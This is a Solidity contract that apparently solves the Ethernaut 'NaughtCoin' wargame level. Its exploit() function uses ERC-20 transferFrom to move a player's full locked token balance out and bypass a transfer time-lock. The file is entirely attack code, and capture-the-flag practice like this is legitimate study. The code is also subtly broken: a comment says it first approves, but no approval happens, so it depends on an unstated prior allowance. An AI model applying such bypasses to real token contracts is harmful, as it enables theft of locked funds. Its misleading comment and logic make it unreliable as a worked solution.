// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function player() external view returns (address);
}

contract DirectAttack {
    function exploit(address token) external {
        IERC20 naughtCoin = IERC20(token);
        
        // As the player, first approve ourselves
        uint256 balance = naughtCoin.balanceOf(msg.sender);
        
        // Then use transferFrom to bypass the lock
        naughtCoin.transferFrom(msg.sender, address(1), balance);
    }
}